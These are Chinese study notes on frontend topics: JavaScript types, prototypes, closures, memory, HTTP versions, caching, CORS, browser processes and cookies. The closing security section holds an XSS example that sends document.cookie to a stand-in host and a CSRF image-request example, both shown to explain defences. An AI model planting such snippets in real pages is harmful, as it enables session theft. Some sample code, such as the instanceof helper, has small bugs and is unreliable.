### 1.js变量类型
- 基本类型：string, number, boolean, null, undefined
- 引用类型：object, array, function
判断类型：
- typeof： 返回值为字符串，bool, number, string, object, function, undefined
```js
typeof null // "object"
// 因为null的字节码开始的前三位为000，与object相同
```
- instanceof： 判断对象是否是某个类的实例，是则返回true，否则返回false
```js
function myInstanceof (obj, Ctor) {
  if (typeof obj !== 'null' || typeof  Ctor !== 'function') {
    return false
  }

  obj = Object.getPrototypeOf(obj)

  while (obj) {
    if (obj === Ctor.prototype) {
      return true
    }
    obj = Object.getPrototypeOf(obj)
  }
  return false
}
```
### 2.null undefined 区别
- null和undefined是基本类型，undefined表示未定义，null表示空对象
- 转为number时，null转为0，undefined转为NaN
- 比较两个值时，双等号返回true，三等号返回false

### 原型
#### 3.prototype和proto
- `prototype`是函数才有的属性,解决继承, 这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。
- `__proto__`是每个对象都有的属性,指向构造函数的原型
- `__proto__===constructor.prototype` （构造器原型）字面量、构建函数方式的指向

- `Object.create()`方法创建一个新对象，使用现有的对象来提供新创建的对象的`__proto__`

- 所有构造器/函数的`__proto__`都指向`Function.prototype`

- 如果构造函数返回的是Object,那么new出来的就是返回值,如果返回的是基本类型,new出来的就是构造函数生成的对象

#### 4.原型链终点是null

#### prototype的constructor属性
构造函数原型上的`constructor`属性，指向构造函数本身，当我们实现继承时，会将原型指向父类实例，那么在访问`constructor`属性时，就会访问到父类的`constructor`属性，而不是子类的`constructor`属性。
当遇到通过子类实例构造新子类实例的场景时，就会错误的构造出父类实例，所以修正后的`constructor`属性，可以正确的构造出子类实例。
```js
function Parent() {
  this.name = 'parent'
}

function Child() {
  Parent.call(this)
  this.name = 'child'
}
Child.prototype = Object.create(Parent.prototype)

Child.prototype.constructor = Child

child1 = new Child()

child2 = new child1.constructor()
```

### 5.js继承

### 6.闭包

#### 闭包的变量是怎么存储的
[闭包中的变量到底存在哪里？](https://juejin.cn/post/6887054571080777735)
[ECMAScript词法环境](https://cloud.tencent.com/developer/article/1676297)
闭包中的变量会存到堆内存中,但并非闭包中所有的变量都存储在堆中，而是只有被内部方法引用的变量才会存储在堆中。

在闭包存在时，会生成一个内部对象`[[Scopes]]`，代表作用域链，其内部存在`[[Closure]]`对象，代表闭包的变量。

### 7.作用域链

  #### 变量对象、活动对象
  [变量对象、活动对象](https://juejin.cn/post/6990526490911703048)


### 8.this

#### call、apply、bind
[apply, call性能问题](https://www.jianshu.com/p/7c797a565f14)
[原理与实现](https://juejin.cn/post/6844903889322377223)
[参考](https://zhuanlan.zhihu.com/p/83130909)
[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind)
`call`、`apply`、`bind`都是函数的方法，第一个参数都是要改变的this指向，也就是想指定的上下文
`call` `apply`都是立即调用函数，`bind`是返回一个绑定好上下文的函数，供以后调用


### 9.new操作符

1. 创建一个新对象
2. 将构造函数的作用域赋给新对象
3. 继承构造函数原型
4. 执行构造函数代码（为新对象添加属性）
5. 返回新对象

```js
var obj = {}; // 创建空对象
obj.__proto__ = Base.prototype; // 原型
Base.call(obj); // 执行构造函数
return obj
```

```js
function myNew(constructor, ...args) {
  const obj = {}
  obj.__proto__ = constructor.prototype
  const result = constructor.apply(obj, args)
  return result instanceof Object ? result : obj
}
```


### 10.消息队列，事件循环

### 11.Promise




### 服务器代理装饰，如何处理cookie


### escape、encodeURI、encodeURIComponent


### 深拷贝


### ES6


### JS 变量存储
  [JS 变量存储](https://juejin.cn/post/6844903997615128583)
  - 栈
  栈是内存中一块用于存储局部变量和函数参数的线性结构，遵循着先进后出的原则。数据只能顺序的入栈，顺序的出栈。当然，栈只是内存中一片连续区域一种形式化的描述，数据入栈和出栈的操作仅仅是栈指针在内存地址上的上下移动而已。
  内存中栈区的数据，在函数调用结束后，就会自动的出栈，不需要程序进行操作，操作系统会自动执行，换句话说：栈中的变量在函数调用结束后，就会消失。
  因此栈的特点：**轻量，不需要手动管理，函数调用时创建，调用结束则消失**

  - 堆
  在栈中存储不了的数据（比如一个对象），就会被存储在堆中，栈中就仅仅保留一个对该数据的引用（也就是该块数据的首地址）。

  > 对于原始类型，数据本身是存在栈内，对于对象类型，在栈中存的只是一个堆内地址的引用。

在 JavaScript 中，变量分为三种类型：
1. 局部变量
2. 被捕获变量
3. 全局变量

###### 局部变量
**在函数中声明，且在函数返回后不会被其他作用域所使用的对象**
如下`local*`都是局部变量
```js
  function test () {
    let local1 = 1;
    var local2 = 'str';
    const local3 = true;
    let local4 = {a: 1};
    return;
  }
```

###### 被捕获变量
在函数中声明，但在函数返回后仍有未执行作用域（函数或是类）使用到该变量，那么该变量就是被捕获变量。下面代码中的 `catch*` 都是被捕获变量。
```js
function test1 () {
    let catch1 = 1;
    var catch2 = 'str';
    const catch3 = true;
    let catch4 = {a: 1};
    return function () {
        console.log(catch1, catch2, catch3, catch4)
    }
}

function test2 () {
    let catch1 = 1;
    let catch2 = 'str';
    let catch3 = true;
    var catch4 = {a: 1};
    return class {
        constructor(){
            console.log(catch1, catch2, catch3, catch4)
        }
    }
}

console.dir(test1())
console.dir(test2())

```

###### 全局变量
全局变量就是 `global`，在 浏览器上为 `window` 在 `node` 里为 `global`。全局变量会被默认添加到函数作用域链的最低端，也就是上述函数中 `[[Scopes]]` 中的最后一个。

全局变量需要特别注意一点：`var` 和 `let/const` 的区别

- var
全局的 `var` 变量其实仅仅是为 `global` 对象添加了一条属性

- let/const
全局的 `let/const` 变量不会修改 `windows` 对象，而是将变量的声明放在了一个特殊的对象下（与 `Scope` 类似）。
```js
let testLet = 1;

console.dir(() => {})
```
以上代码在Chrome中会输出以下对象，其中 `testLet` 变量在 `[[Scopes]]` 中的为类型Script的一项
```js
anonymous()
length: 0
name: ""
arguments: 
caller:
[[Scopes]]: Scopes[2]
  0: Script 
    testLet: 1
    [[Prototype]]: Object
  1: Global {window: Window, self: Window, document: document, name: '', location: Location, …}

```

##### 两种存储方式
1. 栈（Stack）
2. 堆（Heap）

**除了局部变量，其他的全都存在堆中**， 根据变量的数据类型，分为以下两种情况：
1. 如果是基础类型，那栈中存的是数据本身。
2. 如果是对象类型，那栈中存的是堆中对象的引用。

JavaScript 解析器如何判断一个变量是局部变量呢？
判断出是否被内部函数引用即可！
因此存在一种情况，没有被内部函数使用的变量是不会放到`[[Scopes]]`中的`[[Closure]]`。

#### 变量赋值
根据 `=` 号右边变量的类型分为两种方式:

##### 赋值为常量
常量就是一赋值就可以确定的值，如`1`、`"string"`、`true`、`{a: 1}`，这些值一旦声明就不可改变。
假如现在声明变量
```js
let a = 1
```
那么在内存中：
>a => |0X12121|1|

如果现在又声明了一个变量
```js
let b = 2
```
那么内存中就会变成这样：
>a => |0X12121|1|
b => |0X12131|2|

如果声明了一个对象：
```js
let obj = {
  a: 1, 
  b: 2
}
```
内存模型如下：
>a => |0X12121|1|
b => |0X12131|2|
obj => |0x34342|0x43322| => {a: 1, b: 2}

其实 `obj` 指向的内存地址保存的也是一个地址值，那好，如果我们让 `obj.foo = 'foo'` 其实修改的是 0x43322 所在的内存区域，但 `obj` 指向的内存地址不会发生改变，因此，对象是常量！

##### 赋值为变量
在上述过程中的 `a`、`b`、`obj`，都是变量，变量代表一种引用关系，其本身的值并不确定。
```js
let x = a
```
>x => ↘️
a => |0X12121|1|
b => |0X12131|2|
obj => |0x34342|0x43322| => {a: 1, b: 2}

如上图所示，仅仅是将 `x` 引用到与 `a` 一样的地址值而已，并不会使用新的内存空间

#### 变量修改
##### 修改为常量
```js
a = 'foo'
```
>a => |0X12134|'foo'|
x => ↘️
 |0X12121|1|
b => |0X12131|2|
obj => |0x34342|0x43322| => {a: 1, b: 2}

如上所示，仅仅是将 `a` 引用的地址修改了而已


### 路由懒加载原理

### tree-shaking

### HTTP相关

#### HTTPS原理及过程

  ~~~js
    HTTP存在信息传输不安全的缺陷，明文传输，容易被截获、篡改、冒充
    HTTPS在HTTP和TCP之间加了一层加密操作，SSL
    同时采用对称和非对称加密
      数据-》对称加密  客户端需要一个密钥解密
      密钥-》非对称加密

    过程：
    第一阶段：
      认证站点：获取服务端公钥（SSL证书）
      客户端HTTPS请求443端口
      服务器响应，将公钥发给客户端
    
    第二阶段：
      协商密钥：协商此次会话的对称加密密钥
      客户端收到公钥，即SSL证书，并对其验证，通过后，客户端生成对称加密的密钥（客户端密钥），用公钥非对称加密
      客户端发起第二次HTTP请求，将客户端密钥发给服务器
      不会直接交换会话密钥，通过DH算法交换协商信息计算会话密钥

    第三阶段：
      加密传输：
      服务器收到客户端密钥后，用私钥进行非对称解密，拿到客户端密钥，然后用客户端密钥对数据进行对称加密
      服务器将加密过的数据发送给客户端
      客户端接收到密文数据，用客户端密钥进行对称解密，客户端拿到数据
  ~~~

  1. 为什么数据传输是用对称加密？
    - 首先，非对称加密的加解密效率是非常低的，而 http 的应用场景中通常端与端之间存在大量的交互，非对称加密的效率是无法接受的；
    - 另外，在 HTTPS 的场景中只有服务端保存了私钥，一对公私钥只能实现单向的加解密，所以 HTTPS 中内容传输加密采取的是对称加密，而不是非对称加密。
  2. 怎么防范中间人攻击？
    1. 防范获取明文信息，加密传输报文
    2. 防范非法中间代理
       黑客对客户端伪装成服务器，对服务器伪装成客户端，通过非法代理窃取数据。虽然黑客可以获得站点证书，伪装成服务器接收请求，但黑客没有服务器私钥，无法解密数据
    3. 防范解密历史报文
       这种安全防护叫向前安全，通过DH算法，客户端与服务器只需交换少量信息，双方便可独立计算出临时会话密钥用于加密，即使黑客事后获取私钥，也不能计算出会话密钥，从而保证向前安全


##### HTTPS做了什么
- 加密：HTTPS通过对数据加密来使其免受窃听者对数据的监控
- 数据一致性：数据传输过程中不会被篡改，发送的是什么，接收的就是什么
- 身份认证：确认对方的真实身份，防止中间人攻击

#### HTTP

##### 报文
  ~~~js
    请求报文
      请求方法 URL 协议版本
        请求头
        请求体
        
    响应报文
      协议版本 状态码 状态描述
        响应头
        正文	
  ~~~
##### 版本
1. http1.0
2. http1.1
   1. 长连接：数据传输完成TCP不断开，继续使用该连接传输数据
   2. 管道化：多个请求可以同时发送，响应的顺序也是相同的，无法解决队头阻塞的问题
   3. 缓存处理
   4. 短点传输：资源过大时，自动分割，分别上传/下载，网络出现问题时自动在之前的部分继续上传/下载
3. http2.0
   1. 二进制分帧：http1采用纯文本传输，2版本使用二进制，解析效率更高；http2将请求和响应分割为更小的帧，并进行二进制编码
      HTTP2中，同域名下的所有请求都是在同一个TCP上完成的，该连接为全双工，可以乱序发送多个帧，再根据帧首部表示组装
   2. 多路复用：通过一个TCP，双向数据流（双工），每个数据分为多帧发送，可乱序发送，通过帧首部标识组装
      HTTP1中，如果想并发多个请求，需要在不同的TCP上完成，一般浏览器限制TCP的数量为6-8，超出的连接会被挂起等待
   3. 首部压缩：HTTP是无状态的，每次请求都会在请求头添加请求信息，会产生很多重复信息，http2将请求头进行压缩，减少空间占用
   4. 服务端推送
4. http3.0
   <!-- TODO -->


##### HTTP2.0的一些特征
http2中，有了二进制分帧后，不再依赖多个TCP实现多流并行
- 同一域名下的所有请求都在一个连接上完成，一个域名只占用一个TCP连接，使用一个连接并发多个请求和响应
- 单个连接可以承载任意的双向数据流，多个请求响应互补干扰
- 数据流以消息的形式发送，而消息又由一个或多个帧合成，多个帧可以乱序发送，根据帧首部的流标识组装

>###### 帧
http2中的**数据最小传输单位**
###### 流
存在于连接中的一个虚拟通道
[参考](https://juejin.cn/post/6844903935648497678)

**HTTP2的缺陷**
由于http2的多路复用，所有请求都通过同一个TCP发送和响应，那么当TCP丢包时，就会进行重传等操作，这会影响到所有的请求，在这种情况下，http2的性能反而不如http1.1
由此出现了http3，解决这个问题


##### HTTP连接限制
1. http请求结束后TCP是否会断开？
   在http1.0中，请求结束后会断开TCP，但当服务器设置`Connection: keep-alive`后，就不会断开TCP，那么在下一次连接时，SSL的开销也可避免
2. 一个TCP可以对应多少个请求？
   如果断开连接，只能对应一个请求，当设置了`Connection: keep-alive`时，可以对应多个请求
3. 一个TCP中的HTTP能够同时发送同时响应吗？
   http1.1中存在一个问题：单个TCP链接在同一时刻只能处理一个请求，也就是说两个请求的生命周期不能重叠
   http1.1规定了`Pipeline`试图解决这个问题，但这个属性默认是关闭的
   - Pipeline：一个支持持久连接的客户端可以可以在一个连接中发送多个请求（不需要等待请求的响应），收到请求的服务器必须按照收到请求的顺序发送响应
     之所以这么设计的原因：http1.1是一个文本协议，同时返回的响应不能区分对应哪一个请求，，所以顺序必须保持一致
     Pipeline在实际中存在很多问题：
     1. 一些代理服务器不能正确处理Pipeline
     2. 流水线实现是复杂的
     3. 连接头阻塞：建立一个TCP连接后，如果客户端发送了几个请求，按照标准，服务器应该按照相同的顺序响应，加入服务器在处理首个请求时花费了大量时间，那么所有的请求都会受到影响
4. 浏览器对同一Host建立TCP数量的限制
   Chrome 最多允许对同一个 Host 建立六个 TCP 连接。不同的浏览器有一些区别
   - 那么当网页中有多个同一Host的资源时怎么处理呢？
     - 如果是HTTPS链接，那么浏览器就会和服务器商量能不能用HTTP2，使用`Multiplexing`多路传输
     - 如果是HTTP1.1，就会建立多个TCP连接

<!-- todo -->
wep-push

##### 在浏览器中调试HTTP
通常会在控制台的network面板查看网络资源的加载情况，通过`Waterfall`部分查看资源时序
Waterfall中的属性：
- `Queuing` (排队)
  浏览器在以下情况下对请求排队
  存在更高优先级的请求,请求被渲染引擎推迟，这经常发生在 images（图像）上,因为它被认为比关键资源（如脚本/样式）的优先级低。
  此源已打开六个 TCP 连接，达到限值，仅适用于 HTTP/1.0 和 HTTP/1.1。在等待一个即将被释放的不可用的 TCP socket
  浏览器正在短暂分配磁盘缓存中的空间，生成磁盘缓存条目（通常非常快）
- `Stalled` (停滞) - 发送请求之前等待的时间。它可能因为进入队列的任意原因而被阻塞，这个时间包括代理协商的时间。请求可能会因 Queueing 中描述的任何原因而停止。
- `DNS lookup` (DNS 查找) - 浏览器正在解析请求 IP 地址，页面上的每个新域都需要完整的往返(roundtrip)才能进行 DNS 查找
- `Proxy Negotiation` - 浏览器正在与代理服务器协商请求
- `initial connection` (初始连接) - 建立连接所需的时间，包括 TCP 握手/重试和协商 SSL。
- `SSL handshake` (SSL 握手) - 完成 SSL 握手所用的时间
- `Request sent` (请求发送) - 发出网络请求所花费的时间，通常是几分之一毫秒。
- `Waiting` (等待) - 等待初始响应所花费的时间，也称为Time To First Byte(接收到第一个字节所花费的时间)。这个时间除了等待服务器传递响应所花费的时间之外，还包括 1 次往返延迟时间及服务器准备响应所用的时间（服务器发送数据的延迟时间）
- `Content Download`(内容下载) - 接收响应数据所花费的时间(从接收到第一个字节开始，到下载完最后一个字节结束)
- `ServiceWorker Preparation` - 浏览器正在启动 Service Worker
- `Request to ServiceWorker` - 正在将请求发送到 Service Worker
- `Receiving Push` - 浏览器正在通过 HTTP/2 服务器推送接收此响应的数据
- `Reading Push` - 浏览器正在读取之前收到的本地数据

1. 资源优先级
<img src="./images/资源优先级.png" />
打开`Priority`属性，可以查看资源的优先级，doc和css资源优先级比js高，[具体情况查看该链接](https://juejin.cn/post/6844903789518946311)

2. connection id
打开`connection id`属性，可以查看请求的连接id,在http1.1中可以发现请求来自不同的连接，在http2中，连接是相同的
<img src="./images/connection_id.png" alt="http1.1" />
<img src="./images/connectid_http2.png" alt="http2" />

3. Waterfall
这个选项是网络时序，蓝线代表`DOMContentLoaded`事件，红线代表`load`事件，从中还能发现http1.1的请求时序是低于http2的
<img src="./images/waterfall_http1.png" alt="http1">
<img src="./images/waterfall_http2.png" alt="http2">


#### 一些特殊首部字段
Range



### 浏览器渲染流程
css文件 script标签是否打断渲染 
css硬件加速
[参考1](https://juejin.cn/post/6844903966573068301)
[参考2](https://segmentfault.com/a/1190000014520786)

#### 字体加载
[参考](https://zhuanlan.zhihu.com/p/272783891)

### 文件上传与下载

#### 大文件上传和断点续传
[参考](https://juejin.cn/post/6844904046436843527)


### JS Function
- `arguments`对象
  `arguments`对象是所有函数中可用的局部变量
  只有函数被调用时，`arguments`对象才会创建，未调用时其值为`null`

  - 属性
    -  `arguments.callee`
    // 指向当前执行的函数。
    - `arguments.caller`  `arguments.callee.caller`替代了被废弃的 `arguments.caller`
    如果一个函数`f`是在全局作用域内被调用的,则`f.caller`为`null`,相反,如果一个函数是在另外一个函数作用域内被调用的,则`f.caller`指向调用它的那个函数
    // 指向调用当前函数的函数。
    - `arguments.length`
    // 指向传递给当前函数的参数数量。 

- 函数执行
  JS代码在浏览器中运行时，解释器执行代码到调用某个函数时，被调用的函数加入`Call Stack`栈，创建对应这个函数的`执行上下文`
  当一个执行上下文入栈时，它有两个生命周期，创建和执行阶段：
  - 创建阶段：
    - 生成变量对象（`Variable Object`） 
    - 建立作用域链（`Scope chain`） 
    - 确定函数中 `this` 的指向
  - 执行阶段:
    - 变量赋值 
    - 函数引用 
    - 执行其他代码

    执行阶段完毕，执行上下文出栈，内存被回收。

  1. 变量对象
    通常代码中会定义一些变量和函数，解释器首先会找到这些变量和函数的定义，它会在执行上下文创建的时候首先生成**变量对象**
    以函数环境为例，在调用某个函数时，这个函数入栈函数调用栈，此时它处于栈的顶端。此时先进入执行上下文的创建阶段，它包含以下三个部分：
      1. 创建函数的`arguments`对象。检查当前上下文中的参数，建立该对象下的属性与属性值。没有实参的话，属性值为`undefined`。
      2. 这个函数内部的所有函数声明。就是使用`function`关键字声明的函数。在变量对象中以函数名建立一个属性，属性值为指向该函数所在内存地址的引用。如果函数名的属性已经存在，那么该属性将会被新的引用所覆盖。
      3. 这个函数内部的所有变量声明。每找到一个变量声明，就在变量对象中以变量名建立一个属性，属性值为`undefined`。如果变量名称跟已经声明的形式参数或函数相同，则变量声明不会影响已经存在的这类属性。
  2. 活动对象
    还是要以函数环境为主要场景。在进入执行阶段之前，变量对象中的属性都不可访问。进入执行阶段后，变量对象 变成活动对象（`Activation Object`），里面的属性可以被访问了，然后执行代码。
    注意**变成** 这个词。它表明了在函数执行上下文中 变量对象（`Variable Object`） 和活动对象（`Activation Object`） 是同一个对象，它们只是存在**不同生命周期**中。
  3. JS的提升（hsoting）机制
      1. 变量提升
        使用`var`声明变量会造成变量提升，例如
          ```js
          var a = 1
          ``` 
          解释器会将其拆分为
          ```js
          var a
          a = 1
          ```
          两部分，第一部分是变量声明，第二部分是变量赋值。变量声明会提前到代码执行前。
      2. 函数提升
        函数提升与变量提升一样都是提升到当前作用域顶端
        但只有函数声明式才会造成提升
          ```js
          // 函数声明式
          fun() // 可以在函数声明前执行
          function fun() { // 会提升

          }

          // 函数表达式式
          fun1() // 报错
          let fun1 = function a() { // 不会提升

          }
          console.log(a) // undefined
          ```
          
          一个特殊的例子：
          ```js
          console.log(typeof a) // function
          console.log(a) // function a
          function a () {}
          console.log(a) // function a
          var a = 1
          console.log(a) // 1
          ```
          由此可知，**函数提升优先于变量提升**，当`var a`提升时，已有`function a`，则会跳过`var a`,但之后的`a = 1`会将`a`赋值为`1`。

    [参考1](https://juejin.cn/post/6990526490911703048)

### HTTP缓存
浏览器缓存分为强缓存和协商缓存，浏览器加载一个页面的简单流程如下：

1. 浏览器先根据这个资源的http头信息来判断是否命中强缓存。如果命中则直接加在缓存中的资源，并不会将请求发送到服务器。
2. 如果未命中强缓存，则浏览器会将资源加载请求发送到服务器。服务器来判断浏览器本地缓存是否失效。若可以使用，则服务器并不会返回资源信息，浏览器继续从缓存加载资源。
3. 如果未命中协商缓存，则服务器会将完整的资源返回给浏览器，浏览器加载新资源，并更新缓存。

- **强缓存**

  - **Expires**：缓存过期时间  配合 `Last-modified` 
    - Expires有一个非常大的缺陷，它使用一个固定的时间，要求服务器与客户端的时钟保持严格的同步，并且时间到达后，服务器还得重新设定新的时间

  - **Cache-Control**：相对时间，有效期，优先级高

    ​				取值：max-age：时间长度，在这个时间内缓存有效，单位s

    ​							public：可以被任何对象缓存

    ​							private：只能被单个用户缓存，不能被代理服务器缓存

    ​							no-cache：强制所有缓存了的用户，再次请求前发送验证到服务器

    ​							no-store：禁止缓存

- **协商缓存**

  ​	如果未命中强缓存，服务器就会根据请求头中的 `Last-Modify`/`If-Modify-Since`或`Etag`/`If-None-Match` 来判断是否命中协商缓存，若命中返回304

  -  **Last-Modify/If-Modify-Since** ：浏览器第一次请求时，响应头会加上**last-modify**（最后修改时间），当再次请求时，会将该值作为**If-Modify-Since** 返回，服务器据此判断是否命中缓存
  -  **ETag/If-None-Match** ：返回效验码，ETag保证每个资源是唯一的，资源变化ETag也会变化，服务器根据该值判断是否命中缓存
     -  某些资源可能会周期性的修改，但其内容可能没有改变，这时候ETag可以保证资源是否正的被修改
     -  当资源的修改频率在秒级以下时，`Last-Modeify`就不能确认资源是否被修改


- from memory cache
  内存缓存具有两个特点，分别是**快速读取**和**时效性**：
  - 快速读取：内存缓存会将编译解析后的文件，直接存入该进程的内存中，占据该进程一定的内存资源，以方便下次运行使用时的快速读取。
  - 时效性：缓存时效性很短，会随着进程的释放而释放
- from disk cache
  - 硬盘缓存则是直接将缓存写入硬盘文件中，读取缓存需要对该缓存存放的硬盘文件进行I/O操作，然后重新解析该缓存内容，读取复杂，速度比内存缓存慢
- 哪些资源会放到memory，哪些资源会放到disk？
  - 对于大文件来说，大概率是不存储在内存中的，反之优先
  - 当前系统内存使用率高的话，文件优先存储进硬盘
  - 在浏览器中，浏览器会在js和图片等文件解析执行后直接存入内存缓存中，那么当刷新页面时只需直接从内存缓存中读取(from memory cache)；而css文件则会存入硬盘文件中，所以每次渲染页面都需要从硬盘读取缓存(from disk cache)。

### 跨域

- jsonp：通过script标签，得到js代码然后执行，因为标签发出的请求不是ajax

  - 只支持get
  - 调用失败时不会返回状态码
  - 

- CORS（跨域资源共享）：http协议的一部分，主要工作在后端

  - 简单请求：`HEAD`、`POST`、`GET`三种请求方式，且请求头字段在规定范围内

    ​					请求时会在请求头中添加 `Origin` 字段标明请求源，服务器获得后决定是否通过

    ​					服务器许可时，响应头会有几个 `Access-Control-` 字段

    ​					默认不发送cookie

  - 非简单请求：请求方法是`PUT`、`DELETE`，或请求头 `Content-Type` 字段是 `application/json` 

    ​					此时会增加一次请求，称为**预检请求**（`OPTIONS`）

    ​					询问服务器，网页地址是否在允许之列，可以使用哪些字段

    ​					 一旦服务器通过了"预检"请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个`Origin`头信息字段。服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段。 

- 代理

- H5提供postMessage()方法



### 浏览器进程
浏览器是多进程的，Chrome每开一个Tab页就新建一个进程
浏览器有以下进程：
1. Browser进程：浏览器的主进程，只有一个，作用：
   - 浏览器页面显示
   - 浏览器页面管理，创建和销毁其它进程
   - 将Renderer进程得到的Bitmap绘制到页面上
   - 网络资源管理
2. 浏览器插件进程：可以有多个，对应每个插件
3. GPU进程：用于绘制页面，只有一个
4. Renderer进程：浏览器渲染进程，内部是多线程的，默认每个Tab页一个进程，主要用来渲染页面，执行脚本和事件处理等

Renderer进程的线程：
1. GUI渲染线程
   - 负责渲染浏览器界面，解析HTML、CSS，构建DOM树和RenderObject树，布局和绘制等
   - 当页面发生重绘和回流时该线程就会执行
   - 当执行JS脚本时，该进程会挂起
2. javascript引擎线程
   - Javascript内核，用于执行js脚本
   - 只有一个js线程
   - 由于该线程与渲染线程互斥，当JS执行时间过长时，会造成页面卡顿
3. 定时器触发线程
   - setInterval与setTimeout所在线程
   - 不能由js线程管理定时器，因为js线程阻塞会影响时间精度
4. 事件触发线程
   - 控制事件轮询
   - 当脚本代码触发相应事件时（如：click、ajax）会将对应任务添加到该线程
   - 当对应事件符合执行时机时，该线程会将任务添加到任务队列，等待js引擎执行
5. http请求线程
   - 在XMLHttpRequest在连接后是通过浏览器新开一个线程请求
   - 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。



### 本地存储
#### cookie
HTTP是无状态的，服务器无法知道两个请求是否来自同一个浏览器，就增加一个字段表明身份
当浏览器发送请求时，会先检查是否有相应的cookie，有则自动在请求头添加cookie字段携带cookie

##### 设置cookie
- 客户端设置
  ```js
    document.cookie = 'name=value;expires=date;path=path;domain=domain;secure'
  ```
  客户端只能设置以下选项：expires、path、domain、secure，无法设置httponly
- 服务端设置
  请求响应头有一个set-cookie字段，用来设置cookie
  ```js
    res.setHeader('Set-Cookie', 'name=value;expires=date;path=path;domain=domain;secure')
  ```
  可以设置cookie的所有选项，但是每一个set-cookie只能设置一个cookie，要想设置多个cookie，只能设置多个set-cookie字段
##### 读取
使用`document.cookie`获取cookie，会得到分号分隔的所有非`httponly`的cookie
##### 修改
要想修改cookie，只需要重新赋值，但要注意新cookie的`path/domain`必须与旧cookie相同，否则只是添加一个新的cookie
##### 删除
将cookie的过期时间设置为过去的时间，就可以删除cookie，同样，`path/domain`必须与旧cookie相同

##### path 和 domain
domain指定了cookie会被发送到哪些域中，默认为创建该cookie的域，当请求的域是domain的子域时，才允许cookie
path为允许请求的路径，当路径匹配时才允许cookie
| | domain | path |
|-|-|-|
| cookie1 | .a.com | / |
| cookie2 | www.a.com | /b/ |
| cookie3 | b.a.com | / |
| cookie4 | www.a.com | / |
当访问`www.a.com`时
cookie1会被发送，domain/path都符合
cookie2不会被发送，path不符合
cookie3不会被发送，`www.a.com`不是`b.a.com`的子域
cookie4会被发送，domain/path都符合
##### cookie的安全性
- secure选项：当请求时HTTPS或其他安全连接时，才会被发送
  但是保存在本地的cookie文件并未被加密
  在http协议的网页中无法设置该字段
- httponly选项：用来设置cookie是否可以被js访问
  客户端是不能设置该字段的，只能由服务端通过set-cookie设置
- samesite选项：限制第三方cookie，他可以设置3个值：
  - strict：完全禁止第三方cookie，跨站点时不会发送cookie
  - lax：大多数情况也不发送cookie，但是a标签会发送
    | 请求类型 | 示例 | 正常情况 | Lax |
    |-|-|-|-|
    |链接|`<a href="" />`|true|true|
    |预加载|`<link rel="prerender" href="" />`|true|true|
    |GET表单|`<form method="GET action="" />`|true|true|
    |POST表单|`<form method="POST" action="" />`|true|false|
    |ifream|`<ifream src="" />`|true|false|
    |AJAX|get('')|true|false|
    |img|`<img src="" />`|true|false|
  - none: 关闭same-site，但要同时设置`secure`,`Set-Cookie: widget_session=abc123; SameSite=None; Secure`


##### 第三方cookie
通常cookie的域和浏览器地址的域匹配，被称为第一方cookie。那么第三方cookie就是cookie的域域地址的域不匹配，这种cookie通常用在第三方广告网站，为了跟踪用户的浏览记录，提供广告服务。
例如：
用户访问`www.a.com`，这个网站与`www.ad.com`合作，页面中有`ad.com`的图片，请求这张图片时，`ad.com`就会设置cookie`ser-cookie: name='user';like='1'`
当用户访问另一个页面时，同样存在`ad.com`的资源，这样在请求该资源时会将之前设置的cookie发送过去，此时`ad.com`就能通过cookie获取到用户的访问记录，然后设置新的cookie，给用户推送广告

storage


### 安全
#### XSS
使用跨站点脚本可以窃取cookie，当允许js获取cookie时，就会发生攻击者发布恶意代码攻击用户的会话，拿到用户的cookie，例如：
```html
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```
当用户点击链接时，就会将cookie发送到`abc.com`
解决办法：可以设置`httponly`，防止js获取cookie

1. DOM型
2. 反射型
3. 存储型

[参考](https://juejin.cn/post/6844903942036389895)

#### CSRF
跨站请求伪造
例如用户在未关闭`a.com`的情况下又访问了`b.com`，`b.com`中如果有一个指向`a.com`的资源：
```html
<img src="http://a.com?check?user=a&amount=123" />
```
在请求该资源时就会发送`a.com`的cookie，如果`a.com`仅依靠cookie验证身份，那么这次攻击就是成功的
解决办法：增加其他校验手段

#### CSP
<!-- todo -->

### 前端监控